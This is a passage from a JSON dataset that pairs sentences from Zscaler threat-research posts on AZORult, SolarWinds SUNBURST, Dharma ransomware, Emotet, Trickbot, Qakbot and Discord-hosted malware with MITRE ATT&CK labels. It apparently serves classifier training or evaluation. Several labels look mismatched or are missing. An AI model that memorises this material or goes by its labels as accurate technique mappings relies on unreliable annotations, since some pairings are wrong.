Credentials from Password Stores: Credentials from Web Browsers\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  | One of AZORult capabilities |", "labels": ["T1555"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1140 | Deobfuscate/Decode Files or Information\u00a0\u00a0\u00a0\u00a0  | One of AZORult capabilities |", "labels": [], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1573.001 | Encrypted Channel: Symmetric Cryptography | One of AZORult capabilities |", "labels": ["T1573"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1083 | File and Directory Discovery | One of AZORult capabilities |", "labels": ["T1083"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1070.004 | Indicator Removal on Host: File Deletion | One of AZORult capabilities |", "labels": ["T1070"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1105 | Ingress Tool Transfer | One of AZORult capabilities |", "labels": [], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1057 | Process Discovery | One of AZORult capabilities |", "labels": ["T1057"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1055.012 | Process Injection: Process Hollowing | One of AZORult capabilities |", "labels": [], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1012 | Query Registry  | One of AZORult capabilities |", "labels": [], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1113 | Screen Capture | One of AZORult capabilities |", "labels": ["T1113"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1082 | System Information Discovery | One of AZORult capabilities |", "labels": ["T1082"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1016 | System Network Configuration Discovery | One of AZORult capabilities |", "labels": ["T1016"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1033 | System Owner/User Discovery | One of AZORult capabilities |", "labels": ["T1033"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1124 | System Time Discovery | One of AZORult capabilities |", "labels": ["T1124"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1552.001 | Unsecured Credentials: Credentials In Files | One of AZORult capabilities |", "labels": ["T1552"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "**Scheduled task names**", "labels": ["T1053"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Scheduled tasks are created using dropped XML files in %temp% directory with random names.", "labels": ["T1053"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Files are dropped in the \u201cAppData\\Roaming\u201d directory with the same name as a scheduled task.", "labels": ["T1053"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "**C&C servers**", "labels": ["TA0011"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Cybercriminals\u00a0will target users from every conceivable method possible, leveraging their email scams, SMS phishing (SMiShing), typo-squatting, domain-squatting, and malvertising in an attempt to collect sensitive information from the user or worse.", "labels": ["T1566", "T1566", "T1566", "T1589"], "document": "zscaler_2020-11-03_election-2020-themed-scams-and"}, {"sentence": "The ThreatLabZ team at Zscaler came across spam emails with embedded links where threat actors were using election lures to trick users into opening malicious PDF documents, resulting in malware execution.", "labels": ["T1566"], "document": "zscaler_2020-11-03_election-2020-themed-scams-and"}, {"sentence": "As the 2020 presidential election is one of the top trending events, The ThreatLabZ team has been actively monitoring newly registered domains (NRDs) based on election trends and keywords for the past three months.", "labels": ["T1583"], "document": "zscaler_2020-11-03_election-2020-themed-scams-and"}, {"sentence": "On December 13, 2020, [multiple](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) [security](https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/) vendors in conjunction with [CISA](https://us-cert.cisa.gov/ncas/alerts/aa20-352a) disclosed a software supply-chain attack involving the SolarWinds Orion platform.", "labels": ["T1195", "T1195"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "The disclosure detailed the activities of an advanced persistent threat (APT) adversary that was able to gain access to SolarWinds systems to create trojanized updates to the Orion platform between March 2020 and possibly as recently as December 2020.", "labels": ["T1195"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "The trojanized updates included a custom, digitally signed backdoor called SUNBURST.", "labels": ["T1195"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "Based on publicly available data, this adversary demonstrated significant efforts to evade, obfuscate, and clean-up using techniques such as steganography, fingerprinting techniques to identify both target systems as well as analysis systems, rotating infrastructure with a focus on geolocation proximity, as well as executing code in memory as much as possible.", "labels": ["TA0005", "T1027", "T1027", "T1082", "T1614", "T1055"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "These techniques, in combination with using a digitally signed component of a trusted software platform as the initial infection vector, are indicative of a highly skilled and covert adversary willing to expend resources to assure the success of their operation.", "labels": ["T1218"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "Based on public reporting, a SolarWinds Orion system affected by this event\u2014meaning that the SUNBURST backdoor had been successfully installed\u2014would begin network communication to its first stage command and control (C&C) server at avsvmcloud[.]com.", "labels": ["TA0011", "TA0011", "TA0003"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "Additionally, all network activity originating from SolarWinds Orion systems to other internal systems should be reviewed for potential lateral movement.", "labels": ["TA0008"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "The SUNBURST backdoor is a digitally signed DLL file with a specific filename and hash.", "labels": ["T1553"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "* Modification of system tasks", "labels": ["T1543"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "* delete-create-execute-delete-create directory action pattern", "labels": ["T1222"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "* Newly created or unknown local user accounts", "labels": ["T1136"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "Once SUNBURST has been deployed, the adversary will most likely begin to perform reconnaissance actions using the privileges of the Orion system and explore what is available in terms of additional assets to compromise or actions to take.", "labels": ["TA0007"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "* Extremely long duration tokens, which may indicate malicious activity (examine SAML tokens for duration)", "labels": ["TA0006"], "document": "zscaler_2020-12-22_hitchhikers-guide-solarwinds-incident-response"}, {"sentence": "Ransomware Delivered Using RDP Brute-Force Attack", "labels": ["T1190"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Threat actors scan for these publicly open RDP ports to conduct distributed brute-force attacks.", "labels": ["T1021"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Systems that use weak credentials are easy targets, and, once compromised, attackers\u00a0sell access to the hacked systems on the dark web to other cybercriminals.", "labels": ["T1110"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Ransomware groups such as SamSam and Dharma have been spreading almost exclusively via RDP for years.", "labels": ["T1021"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "In this case study, we will look at Dharma ransomware attacks.", "labels": ["T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Dharma, also known as Crysis, has been distributed under a ransomware-as-a-service (RaaS) model since 2016.", "labels": ["T1486", "T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Attackers use open-source port-scanning tools to scan for exposed RDP ports online and then try to gain access to a system using brute-force tools or stolen credentials purchased from the dark web.", "labels": ["T1595", "T1110"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "After attackers gain access to the target system, they go on to make the system vulnerable by deleting backups, disabling antivirus software, and changing configuration settings.", "labels": ["T1490", "T1562", "T1562"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Once the security is disabled and the network vulnerable, attackers deliver malware payloads.", "labels": ["T1562", "T1105"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "The process involves installing ransomware, using infected machines to distribute spam, deploying keyloggers, or installing backdoors to be used for future attacks.", "labels": ["T1486", "T1566", "T1056", "TA0003"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "The below figure shows the infection cycle of Dharma ransomware delivered via RDP brute-force attack.", "labels": ["T1486", "T1110"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "![Infection chain of RDP brute force attack delivers Dharma ransomware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/rdp_ransom/iv1.JPG)", "labels": ["T1110", "T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "*Figure 1:\u00a0Infection chain of RDP brute-force attack delivers Dharma ransomware*", "labels": ["T1110", "T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Once the attacker gains access to the machine, the following files are uploaded:", "labels": ["T1105"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "[ns.exe](https://www.softperfect.com/products/networkscanner/) is a network enumeration and scanning tool used by attackers to scan SMB shares, open ports, and services through which they can move within the network.", "labels": ["T1046"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "[Process Hacker](https://github.com/processhacker/processhacker) is a program used mostly by system administrators for monitoring, debugging, and troubleshooting, but in this case, it was used for malicious purposes such as disabling AV or services.", "labels": ["T1562"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Following the pre-execution process, the attacker uploads a ransomware file and executes it.", "labels": ["T1486", "TA0002"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Once executed, this variant of Dharma ransomware uses the below commands to quietly delete all of the shadow volume copies on the machine.", "labels": ["T1486", "T1490"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "For persistence, the ransomware executes the following commands:", "labels": ["TA0003", "T1486", "TA0002"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "2.Copy file to 'Startup' folder", "labels": ["T1547"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "3.Copy file to 'Common Startup\u2019 folder", "labels": ["T1547"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "The ransomware encrypts files with the following extensions:", "labels": ["T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "*Figure 2:\u00a0File extensions to encrypt*", "labels": ["T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "The ransomware encrypts files using an AES 256 algorithm.", "labels": ["T1486", "T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "This encrypted AES key is stored at the end of the encrypted file along with the filename.", "labels": ["T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "*Figure 3:\u00a0Encrypted files*", "labels": ["T1486"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "After encrypting the files, the ransomware pops up two different ransom notes on the victim\u2019s computer.", "labels": ["T1486", "T1491"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "One is the *Info.hta* file, which is launched via autorun when a user logs into the computer.", "labels": ["T1547"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "### **Lateral movement**", "labels": ["TA0008"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Dharma ransomware uses typical methods for obtaining credentials and propagating laterally within a network.", "labels": ["T1486", "TA0006", "TA0008"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "In most cases, it uses the Mimikatz tool, which allows it to dump the network share credentials, and in other cases, it uses NirSoft CredentialsFileView, which allows for the recovery of passwords stored in encrypted credential files.", "labels": ["S0002", "S0002"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "The obtained credentials are used to attempt lateral movement inside the on-prem as well as public cloud infrastructure.", "labels": ["S0002"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "In some cases, the ransomware tries to spread through the network by taking advantage of the compromised Domain Controller and deploying a Default Domain Policy that will run the ransomware payload on StartUp for each machine.", "labels": ["T1486", "T1486", "T1484", "T1547"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "Since Dharma ransomware is usually installed by gaining access to Remote Desktop Services, it is important to ensure that those services are properly locked.", "labels": ["T1486", "T1021"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "This includes ensuring that computers running Remote Desktop Services do not connect directly to the internet.", "labels": ["T1021"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "While applying security patches is always important, most RDP-based attacks rely on cracking weak credentials, so passwords should be long, unique, and random.", "labels": ["T1563", "T1110"], "document": "zscaler_2021-01-08_ransomware-delivered-using-rdp-brute"}, {"sentence": "The following sections describe recent activities for five of the top malware families, including Emotet, Trickbot, Dridex, ZLoader, and Qakbot.", "labels": ["S0367", "S0266", "S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "### **Emotet**", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "**[Update]** \u2013 On January 27, 2021, Europol announced a [global action in disrupting](https://www.europol.europa.eu/newsroom/news/world%25E2%2580%2599s-most-dangerous-malware-emotet-disrupted-through-global-action) Emotet botnet operations.", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Zscaler ThreatLabZ has been closely tracking Emotet for several years (see blogs from [October 2019](/blogs/security-research/emotet-back-action-after-short-break), [February 2019](/blogs/security-research/demystifying-crypter-used-emotet-qbot-and-dridex), and [August 2017](/blogs/security-research/look-recent-emotet-campaigns-august-2017)).", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "We can confirm that we haven't seen any updates or activity from the Emotet C&C infrastructure in the past 48 hours, which indicates that the takedown operation has been successful.", "labels": ["S0367", "TA0011"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "However, we have seen similar gangs push out new variants and resurrect the botnet using a new C&C infrastructure.", "labels": ["TA0011"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "We are closely monitoring for any new Emotet variants and activity.", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Emotet resumed its activity as of Monday, January 4, 2021.", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "To take advantage of the holiday season, Emotet briefly ramped up its activity between December 21 and 30, 2020.", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "During this ramped-up activity, Emotet was mostly using a *reply chain* (also known as *email thread hijacking)* spam email as the bait.", "labels": ["S0367", "T1566", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "A reply chain attack is when threat actors hijack real email threads and utilize legitimate email messages stolen from victims\u2019 email applications.", "labels": ["T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "This email reply is again targeted to addresses from the original email, allowing it to further gain trust from targets.", "labels": ["T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "While the first batch of emails was targeting English-speaking countries, spam emails in German, Italian, French,\u00a0 Spanish, and Polish followed shortly thereafter.", "labels": ["T1566", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "An example of an Emotet reply chain spam email in Italian is shown in Figure 3.", "labels": ["S0367", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "##### ***Figure 3****: Emotet reply chain example*", "labels": ["S0367", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "The main Emotet loader had some minor changes after returning from a brief break.", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Emotet continued to use spam with malicious Microsoft Word documents attached as the primary distribution method.", "labels": ["S0367", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "On January 20,2021, Emotet increased the build number to 0x13461C8 (20210120) and the loader version number to 0x1770 (6000).", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Another interesting tactical move by Emotet that started in January was the shift to password-protected ZIP attachments.", "labels": ["S0367", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Instead of including the password in the email body text, Emotet started using embedded images that contain the ZIP password.", "labels": ["S0367", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "The group has also continued to use a DLL file for the loader instead of a standard Windows executable, which may be to further evade detection.", "labels": ["T1574"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Emotet was last seen deploying the following modules:", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "* Browser password stealer (based on WebPassView)", "labels": ["T1606"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "* Email password stealer (MailPassView)", "labels": ["T1114"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "* Email content stealer", "labels": ["T1114"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "* Email contact stealer", "labels": ["T1114"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "In addition, Emotet has been observed delivering Trickbot as a second-stage payload.", "labels": ["S0367", "S0266", "T1105"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "**Indicators -\u00a0[Emotet IOCs](https://pastebin.com/bFAW538P)**", "labels": ["S0367"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "### **Trickbot**", "labels": ["S0266"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Emotet started dropping Trickbot as a secondary payload on victim machines after it returned from the holiday break.", "labels": ["S0367", "S0266", "T1105"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Trickbot is operated by the same threat actor that deploys Conti and Ryuk ransomware.", "labels": ["S0266", "S0575", "S0446", "T1486"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Therefore, these ransomware operations likely resumed around the same time as well.", "labels": ["T1486"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Emotet was distributing Trickbot with the group tags *mor12* and *mor13*.", "labels": ["S0367", "S0266", "T1105"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "There have not been any significant changes in Trickbot following the holiday break.", "labels": ["S0266"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Trickbot was also distributed by another spam campaign on the same day by the group tag *rob35*.", "labels": ["S0266", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "This specific campaign was being distributed via SpamEx, which distributed a malicious JavaScript file embedded in a ZIP file.", "labels": ["T1059", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "When opened, the JavaScript was used to invoke PowerShell to download and execute Trickbot from phishing sites.", "labels": ["T1059", "S0266", "T1059"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "The Trickbot campaigns with the group tags *tot6* and *lib6* have also been observed since the holiday break.", "labels": ["S0266"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "**Indicators -\u00a0[Trickbot IOCs](https://pastebin.com/mAzUnpUQ)**", "labels": ["S0266"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "### **Dridex**", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "On January 11, 2021, ThreatLabZ observed the emergence of Dridex with a Cutwail spam campaign.", "labels": ["T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "The group used an invoice theme to distribute the Dridex loader.", "labels": ["T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "The Cutwail spam distributed payloads for Dridex sub-botnets 10444 and 10555 as Microsoft Excel attachments.", "labels": ["T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Dridex continues using DLL files for the loader instead of Windows executables, a technique that has been recently employed by the Emotet and Qakbot threat groups as well.", "labels": ["S0367", "S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "There was another Dridex campaign with botnet 111 observed a day later, which was using the RIG exploit kit (EK).", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "The same RIG EK gate was used before the Christmas holiday.", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "**Indicators - [Dridex IOCs](https://pastebin.com/Mxa6Bfad)**", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "### **Qakbot**", "labels": ["S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "On January 19, 2021, Qakbot emerged with a new spam campaign dropping a Qakbot payload with the campaign ID *abc118*.", "labels": ["S0650", "S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Similar to Emotet, Qakbot is using reply chain spam email attacks.", "labels": ["S0367", "S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Qakbot was also seen using a \u201ccomplaint copy\" spam theme.", "labels": ["S0650", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Qakbot spam campaigns are distributing malicious Excel files embedded inside a ZIP attachment.", "labels": ["S0650", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Like Emotet, Dridex, and ZLoader, Qakbot is using a DLL file for the loader instead of Windows executables.", "labels": ["S0367", "S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "##### ***Figure 4****: Reply chain spam email distributing Qakbot*", "labels": ["S0650", "T1566"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "**Indicators - [Qakbot IOCs](https://pastebin.com/MdbbHFhg)**", "labels": ["S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "### **ZLoader**", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "ThreatLabZ observed new ZLoader activity on January 11,\u00a02021.", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "So far in 2021, four different ZLoader campaigns have been observed, primarily targeting US\u00a0and EU banks and financial institutions.", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "**Indicators - [ZLoader IOCs](https://pastebin.com/n4JR2CeZ)**", "labels": [], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Some have more regular\u00a0Monday through Thursday\u00a0cycles, while others, such as Emotet and Qakbot, are unpredictable.", "labels": ["S0367", "S0650"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Malware authors continually adapt their techniques and change their code to improve distribution, persistence, evasion,\u00a0and overall success.", "labels": ["TA0003", "TA0005", "TA0001"], "document": "zscaler_2021-01-29_did-covid-cancel-christmas-cybercriminals"}, {"sentence": "Discord CDN: A Popular Choice for Hosting Malicious Payloads", "labels": ["T1608"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Attackers have often exploited the popularity of certain games ([Among Us](/blogs/security-research/among-us-imposter-google-play) was a recent example) to lure players into downloading fake versions that served malware.", "labels": ["T1566"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Cybercriminals are using Discord CDN to host malicious files as well as for command-and-control (C&C) communication.", "labels": ["TA0011", "T1102"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Malicious files are renamed as pirated software or gaming software to trick gamers.", "labels": ["T1036"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* File icons are also related to gaming software to trick gamers.", "labels": ["T1036"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Multiple categories of malware are being served through the Discord app\u2019s CDN infrastructure - ransomware, stealers, and cryptominers.", "labels": ["T1486", "TA0010", "T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The attack usually starts with spam emails in which users are tricked with\u00a0legitimate-looking templates into downloading next-stage payloads.", "labels": ["T1566"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "It\u2019s worth noting, however, that using Discord to host payloads is not new.", "labels": ["T1608"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "This campaign uses Discord services to form a URL to host malicious payloads as follows: *https://cdn.discordapp.com/attachments/ChannelID/AttachmentID/filename.exe*", "labels": ["T1608"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "But attackers also use Discord, often to distribute malicious files and steal information.", "labels": ["T1608"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "For example, an attacker can upload a malicious file on a Discord channel and share its public link with others\u2014**even non-Discord users can download it**.", "labels": ["T1608", "T1566"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Worse, a file sent from Discord is there forever, so even if an attacker deletes a file within Discord, its link can still be used to download the malicious file.", "labels": ["T1566"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "1.Epsilon ransomware", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "2.Redline stealer", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "3.XMRig miner", "labels": ["T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "### **Epsilon ransomware**", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "We have analyzed the Epsilon ransomware loader in which execution starts with dropping an .inf file and .exe file in the Windows/Temp folder.", "labels": ["T1486", "TA0002"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* persistence()\u00a0- Establishes persistence on the victim machine", "labels": ["TA0003"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* encryptionStage() - Encrypt files", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* wallpap() - Download ransom image from Discord", "labels": ["T1105"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* extract() - Download ransom note from\u00a0Discord", "labels": ["T1105"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* sapi() - Display ransom note", "labels": ["T1491"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* x3() - Delete shadow copy(Recovery File)", "labels": ["T1490"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* clearmem() - Clean Memory", "labels": ["T1490"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The malware establishes persistence by creating the follow registry key on the victim's machine:", "labels": ["T1547"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "![Run key entry for persistence](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/persistence.PNG)", "labels": ["T1547"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 4: Run key entry for persistence*", "labels": 